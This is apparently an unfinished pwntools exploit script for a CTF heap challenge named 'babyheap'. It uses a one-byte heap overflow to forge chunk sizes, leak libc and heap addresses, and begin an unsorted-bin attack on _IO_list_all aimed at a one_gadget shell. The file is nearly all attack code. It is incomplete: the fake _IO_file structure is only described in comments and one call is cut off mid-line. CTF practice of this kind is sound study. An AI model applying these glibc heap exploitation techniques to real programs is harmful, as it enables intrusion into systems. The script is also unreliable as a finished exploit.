from pwn import *

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote("202.120.7.204", 127 )
    one_gadget_offset = 0x3f35a
else:
    p = process("./babyheap")
    one_gadget_offset = 0x4526a
    main_arena_offset = 0x3c4b20
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        gdb.attach(p, """
              set disassembly-flavor intel
               b *(0x555555554000 + 0x119b)
               b *(0x555555554000 + 0xe88)
               b *(0x555555554000 + 0xfa9)
               b *(0x555555554000 + 0xd54) 
               b *(0x555555554000 + 0x10C2) 
               """)
               
def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.sendline(str(size))

def update(idx, size, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.sendline(str(idx))
    p.sendline(str(size))
    p.sendline(content)

def delete(idx):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.sendline(str(idx))

def view(index):
    p.readuntil("Command: ")
    p.sendline("4")
    p.readuntil("Index: ")
    p.sendline(str(index))
    p.readuntil("Chunk[" + str(index) + "]: ")
    content = p.readline()
    return content


print "[-]Leak and setup phase"
alloc(24) # idx 0
alloc(16)
alloc(72) # Overlap smallbin with this fastbin so we can view metadata
alloc(24)
alloc(16) # idx 4

alloc(32) # will be used to get a heap leak. Ptr to this chunk will be put in overlapping fastbin chunk

# One-byte overflow vuln
update(0, 25, "A"*24 + "\x91") # last byte is new size for chunk idx 1. Smallbin sized

update(3, 24, 'B'*16 + p64(0x90)) # Set prev_size of smallbin chunk's nextchunk

delete(1) # Free forged smallbin chunk

alloc(24) # alloc a new fastbin size, will be broken off the start of the freed smallbin chunk

# Smallbin metadata (main_arena freelist ptrs) now overlaps with chunk 2
arena_leak = u64(view(2)[:8])
print "main_arena leak: ", hex(arena_leak)

libc_base = arena_leak - 0x3c4b78
print "libc_base addr: ", hex(libc_base)

main_arena = libc_base + main_arena_offset
malloc_hook = main_arena - 0x10
print "malloc_hook addr: ", hex(malloc_hook)

one_gadget = libc_base + one_gadget_offset

# Now get a heap leak 
alloc(32) # idx 6
delete(5)
delete(6)
heap_leak = u64(view(2)[:8])
print "heap leak: ", hex(heap_leak)
heap_base = heap_leak - 0x60
print "heap base: ", hex(heap_base)

# Exploit phase
print "[-]Exploit phase"

io_list_all = libc_base + 0x3c5540

# Get the previous contents of chunk2 to write back into chunk2
prev_chunk2 = view(2)[:-17]

# Unsorted bin attack, writing addr of unsorted bin to _IO_list_all
update(2, len(prev_chunk2)+8, prev_chunk2 + p64(io_list_all-0x10))

# Create a fake smallbin[4] 0x60(96) sized chunk
# Use one-byte overflow again, this time on chunk3
# Now chunk4 is smallbin size 0x60
update(3, 25, 'D'*24 + "\x61")
alloc(88) # idx 5?
# update(5, 

delete(4) # Free forged smallbin chunk

# Create a fake _IO_file struct

# Forge vtable (or, use IO_wstr/IO_str)
view(2)

p.interactive()







